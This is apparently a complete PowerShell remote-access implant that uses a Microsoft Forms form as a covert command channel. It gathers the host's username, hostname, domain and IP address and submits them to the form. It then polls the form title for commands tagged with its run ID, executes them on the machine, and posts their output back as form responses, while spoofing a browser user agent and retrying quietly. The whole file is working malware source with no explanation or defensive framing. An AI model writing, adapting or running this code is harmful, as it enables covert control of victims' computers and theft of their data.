$ErrorActionPreference = 'Stop'

# PowerShell 5.1 still negotiates TLS 1.0 by default on some machines.
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12

# Value of the `id=` query parameter on the response page URL.
$FormId = ''

# Host used to build the response page URL; redirects are followed.
$FormsHost = 'https://forms.cloud.microsoft'

# Expected question count. A mismatch stops the script instead of submitting.
$ExpectedFieldCount = 9

# Field left empty on the phase 1 submission (position, 1-based).
$EmptyFieldOnFirstSubmit = 9

# Seconds between title reads in phase 2.
$PollIntervalSeconds = 3

function Get-EnvironmentInfo {
    [CmdletBinding()]
    [OutputType([psobject])]
    param()

    $userName   = [System.Environment]::UserName
    $hostName   = [System.Environment]::MachineName
    $userDomain = $env:USERDOMAIN

    try {
        $computerDomain = [System.Net.NetworkInformation.IPGlobalProperties]::GetIPGlobalProperties().DomainName
    }
    catch {
        $computerDomain = ''
    }

    $isDomainJoined = -not [string]::IsNullOrWhiteSpace($computerDomain) -and
                      $userDomain -ne $hostName

    $domain = if ($isDomainJoined) {
        if ($computerDomain) { $computerDomain } else { $userDomain }
    }
    else {
        "$userDomain (workgroup/standalone)"
    }

    $localIp = $null
    try {
        $localIp = Get-CimInstance -ClassName Win32_NetworkAdapterConfiguration `
                        -Filter 'IPEnabled = TRUE' -ErrorAction Stop |
                   Select-Object -ExpandProperty IPAddress |
                   Where-Object { $_ -match '^\d{1,3}(\.\d{1,3}){3}$' -and $_ -ne '127.0.0.1' } |
                   Select-Object -First 1
    }
    catch {
        $localIp = $null
    }

    if (-not $localIp) {
        try {
            $localIp = [System.Net.Dns]::GetHostAddresses($hostName) |
                       Where-Object { $_.AddressFamily -eq 'InterNetwork' -and
                                      -not [System.Net.IPAddress]::IsLoopback($_) } |
                       Select-Object -First 1 -ExpandProperty IPAddressToString
        }
        catch {
            $localIp = $null
        }
    }

    if (-not $localIp) { $localIp = '127.0.0.1' }

    # The UUID identifies the RUN and must stay the same across all calls: it goes
    # into a form field and is later compared against the title tag. Script scope so
    # it lives until the run ends.
    if (-not $script:RunUuid) {
        $script:RunUuid = [System.Guid]::NewGuid().ToString('N').Substring(0, 8)
    }

    $now = Get-Date

    [pscustomobject]@{
        PSTypeName     = 'Environment.Info'
        Username       = $userName
        Hostname       = $hostName
        Domain         = $domain
        IsDomainJoined = [bool]$isDomainJoined
        LocalIP        = $localIp
        UUID           = $script:RunUuid
        DateTime       = $now
        DateTimeString = $now.ToString('yyyy-MM-dd HH:mm:ss')
    }
}

function Invoke-HostCommand {
    [CmdletBinding()]
    param(
        [Parameter(Mandatory = $true, Position = 0)]
        [ValidateNotNullOrEmpty()]
        [string] $Command,

        [Parameter(Position = 1, ValueFromRemainingArguments = $true)]
        [object[]] $ArgumentList = @(),

        [hashtable] $Parameters = @{}
    )

    $types = 'Cmdlet,Function,Alias,Application'

    $candidates = @(, @($Command, $ArgumentList))
    if ($ArgumentList.Count -eq 0 -and $Command -match '\s') {
        $tokens = @([regex]::Matches($Command, '(?:"[^"]*"|\S)+') |
                    ForEach-Object { $_.Value -replace '"', '' })
        if ($tokens.Count -gt 1) {
            $candidates += , @($tokens[0], @($tokens[1..($tokens.Count - 1)]))
        }
    }

    $info = $null
    $commandArgs = @()
    foreach ($candidate in $candidates) {
        try {
            $info = $ExecutionContext.InvokeCommand.GetCommand($candidate[0], $types)
        }
        catch {
            $info = $null
        }
        if ($info) { $commandArgs = $candidate[1]; break }
    }
    if (-not $info) {
        throw "Command not found: '$Command'."
    }

    $hops = 0
    while ($info.CommandType -eq 'Alias' -and $hops -lt 10) {
        $target = $info.ResolvedCommand
        if (-not $target) {
            try   { $target = $ExecutionContext.InvokeCommand.GetCommand($info.Definition, $types) }
            catch { $target = $null }
        }
        if (-not $target) { break }
        $info = $target
        $hops++
    }

    Write-Verbose "Running $($info.CommandType) $($info.Name)"
    & $info @Parameters @commandArgs
}

$Environment = Get-EnvironmentInfo

$Answers = @(
    $Environment.Username          
    $Environment.Hostname          
    $Environment.Domain            
    $Environment.IsDomainJoined    
    $Environment.LocalIP           
    $Environment.UUID             
    $Environment.DateTime          
    $Environment.DateTimeString    
    ''                             
)

# Command execution will be handled in the polling loop
# No static overrides needed


function Resolve-FormIdentity {
    param([string] $FormId, [Microsoft.PowerShell.Commands.WebRequestSession] $Session)

    if ([string]::IsNullOrWhiteSpace($FormId)) {
        exit 1
    }

    $base64 = $FormId.Replace('-', '+').Replace('_', '/')
    $base64 = $base64.PadRight($base64.Length + ((4 - $base64.Length % 4) % 4), '=')

    try {
        $bytes = [Convert]::FromBase64String($base64)
    }
    catch {
        exit 1
    }

    if ($bytes.Length -le 32) {
        exit 1
    }

    $pageUrl = "$FormsHost/Pages/ResponsePage.aspx?id=$([Uri]::EscapeDataString($FormId))"
    $page = Invoke-WebRequest -Uri $pageUrl -WebSession $Session -UseBasicParsing -MaximumRedirection 10

    # PS 5.1 exposes ResponseUri; PS 7 exposes RequestMessage.RequestUri.
    $finalUrl = if ($page.BaseResponse.PSObject.Properties.Name -contains 'ResponseUri') {
        $page.BaseResponse.ResponseUri.AbsoluteUri
    } else {
        $page.BaseResponse.RequestMessage.RequestUri.AbsoluteUri
    }

    $uri = [Uri] $finalUrl

    [pscustomobject]@{
        TenantId = [guid]::new([byte[]] $bytes[0..15])
        OwnerId  = [guid]::new([byte[]] $bytes[16..31])
        FormId   = $FormId      # the whole `id` string is the form identifier
        PageUrl  = $finalUrl
        BaseUrl  = "$($uri.Scheme)://$($uri.Host)"
    }
}

function Get-FormApiUri {
    # The two verbs use DIFFERENT entities:
    #   read  : .../light/runtimeForms('{id}')     <- POST here returns 405
    #   write : .../forms('{id}')/responses        <- no /light segment
    param(
        [pscustomobject] $Form,
        [ValidateSet('Read', 'Submit')] [string] $Purpose
    )

    $root = "$($Form.BaseUrl)/formapi/api/$($Form.TenantId)/users/$($Form.OwnerId)"

    if ($Purpose -eq 'Read') {
        "$root/light/runtimeForms('$($Form.FormId)')"
    } else {
        "$root/forms('$($Form.FormId)')/responses"
    }
}

function New-FormHeaders {
    param([pscustomobject] $Form)

    @{
        'Accept'                   = 'application/json'
        'Referer'                  = $Form.PageUrl
        'Origin'                   = $Form.BaseUrl
        'x-ms-form-request-ring'   = 'business'
        'x-ms-form-request-source' = 'ms-formweb'
    }
}

function Get-FormDefinition {
    param([pscustomobject] $Form, [Microsoft.PowerShell.Commands.WebRequestSession] $Session)

    $uri = (Get-FormApiUri $Form -Purpose Read) + '?$expand=questions($expand=choices)'
    Invoke-RestMethod -Uri $uri -WebSession $Session -Headers (New-FormHeaders $Form) -Method Get
}

function Get-OrderedQuestions {
    # The API returns the questions out of display order; `order` is what rules.
    param($Definition)

    @($Definition.questions | Sort-Object order)
}

function Split-FormTitle {
    # Splits the title into the two parts the trigger watches:
    #   "# [3f9a1c2b] some text"  ->  Tag = '3f9a1c2b', Text = 'some text'
    # Without brackets, Tag is $null and the whole title lands in Text.
    param([string] $Title)

    $match = [regex]::Match([string] $Title, '\[([^\]]*)\]\s*(.*)$')

    if ($match.Success) {
        [pscustomobject]@{
            Tag  = $match.Groups[1].Value.Trim()
            Text = $match.Groups[2].Value.Trim()
        }
    } else {
        [pscustomobject]@{
            Tag  = $null
            Text = ([string] $Title).Trim()
        }
    }
}

function New-AnswerMap {
    # Pairs each $Answers value with the question at the same position and validates
    # the alignment before anything gets submitted.
    param($Questions, [object[]] $Values, [int] $Expected)

    if ($Questions.Count -ne $Expected) {
        exit 1
    }
    if ($Values.Count -ne $Expected) {
        exit 1
    }

    $map = [ordered]@{}

    for ($i = 0; $i -lt $Expected; $i++) {
        $question = $Questions[$i]
        $value = $Values[$i]

        $isEmpty = ($null -eq $value) -or (($value -isnot [array]) -and [string]::IsNullOrEmpty([string] $value))
        if ($question.required -and $isEmpty) {
            exit 1
        }

        $map[[string] $question.id] = $value
    }

    $map
}

function New-ValuesWithOverrides {
    # Copies $Answers applying overrides by position (1-based).
    # Clone() preserves nested arrays; @(...) would flatten them.
    param([object[]] $Values, [hashtable] $Overrides)

    $copy = $Values.Clone()

    foreach ($position in $Overrides.Keys) {
        $index = [int] $position - 1
        if ($index -lt 0 -or $index -ge $copy.Count) {
            exit 1
        }
        $value = $Overrides[$position]

        # A scriptblock is evaluated now, at submission time, so fields like a random
        # string come out fresh on every fire instead of frozen at startup.
        if ($value -is [scriptblock]) { $value = & $value }

        $copy[$index] = $value
    }

    ,$copy
}

function ConvertTo-AnswerPayload {
    # Builds the answers array. Each item is { questionId, answer1 }, where answer1 is
    # always a string; multiple choice goes in as a serialized JSON array.
    param([System.Collections.Specialized.OrderedDictionary] $Map)

    $items = foreach ($questionId in $Map.Keys) {
        $value = $Map[$questionId]

        $answer1 = if ($value -is [array]) {
            ConvertTo-Json @($value) -Compress
        } else {
            [string] $value
        }

        [pscustomobject]@{
            questionId = $questionId
            answer1    = $answer1
        }
    }

    # The API expects `answers` as a STRING containing JSON, not a native array.
    ConvertTo-Json @($items) -Compress -Depth 5
}

function Send-FormResponse {
    param(
        [pscustomobject] $Form,
        [string] $AnswersJson,
        [Microsoft.PowerShell.Commands.WebRequestSession] $Session,
        [datetime] $StartedAt
    )

    $body = @{
        startDate      = $StartedAt.ToUniversalTime().ToString('yyyy-MM-ddTHH:mm:ss.fffZ')
        submitDate     = (Get-Date).ToUniversalTime().ToString('yyyy-MM-ddTHH:mm:ss.fffZ')
        answers        = $AnswersJson
        submitLanguage = (Get-Culture).Name
    } | ConvertTo-Json -Compress

    Invoke-RestMethod -Uri (Get-FormApiUri $Form -Purpose Submit) -Method Post `
        -WebSession $Session -Headers (New-FormHeaders $Form) `
        -ContentType 'application/json;odata.metadata=minimal;odata.streaming=true' `
        -Body ([Text.Encoding]::UTF8.GetBytes($body))
}

function Invoke-Submission {
    param(
        $Questions,
        [object[]] $Values,
        [pscustomobject] $Form,
        [Microsoft.PowerShell.Commands.WebRequestSession] $Session
    )

    $map = New-AnswerMap -Questions $Questions -Values $Values -Expected $ExpectedFieldCount
    $json = ConvertTo-AnswerPayload $map

    Send-FormResponse -Form $Form -AnswersJson $json -Session $Session -StartedAt (Get-Date) | Out-Null
}

$session = New-Object Microsoft.PowerShell.Commands.WebRequestSession
$session.UserAgent = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 ' +
                     '(KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36'

$form = Resolve-FormIdentity -FormId $FormId -Session $session

$definition = Get-FormDefinition -Form $form -Session $session
$questions = Get-OrderedQuestions $definition

# The tag this run answers to; same value that goes into field F.
$ExpectedTag = $Environment.UUID

Invoke-Submission -Questions $questions `
    -Values (New-ValuesWithOverrides -Values $Answers -Overrides @{ $EmptyFieldOnFirstSubmit = '' }) `
    -Form $form -Session $session

# $lastText holds the text after the ] of the last SUBMISSION, so a title flipping
# between two values doesn't submit twice per cycle.
$hasSubmitted = $false
$lastText = $null

while ($true) {
    # An isolated network failure must not take down a loop that may run for hours.
    try {
        $definition = Get-FormDefinition -Form $form -Session $session
        $parts = Split-FormTitle $definition.title
    } catch {
        Start-Sleep -Seconds $PollIntervalSeconds
        continue
    }

    $shouldSubmit = $false

    if ($parts.Tag -ne $ExpectedTag) {
        # Not this run's tag: nothing to do.
    }
    elseif (-not $hasSubmitted) {
        $shouldSubmit = $true
    }
    elseif ($parts.Text -ne $lastText) {
        $shouldSubmit = $true
    }

    if ($shouldSubmit) {
        try {
            # Reread the questions: if the title changed, the structure may have too.
            $questions = Get-OrderedQuestions $definition

            # Execute the command from the title and capture output
            $commandOutput = ""
            if ($parts.Text) {
                try {
                    $result = Invoke-HostCommand $parts.Text
                    $commandOutput = ($result | Out-String).Trim()
                } catch {
                    $commandOutput = "Error: $($_.Exception.Message)"
                }
            }

            # Submit with command output in field 9
            $overrides = @{
                9 = $commandOutput
            }
            Invoke-Submission -Questions $questions `
                -Values (New-ValuesWithOverrides -Values $Answers -Overrides $overrides) `
                -Form $form -Session $session

            $hasSubmitted = $true
            $lastText = $parts.Text
        } catch {
            # Keep watching: the next cycle retries with the same trigger condition.
        }
    }

    Start-Sleep -Seconds $PollIntervalSeconds
}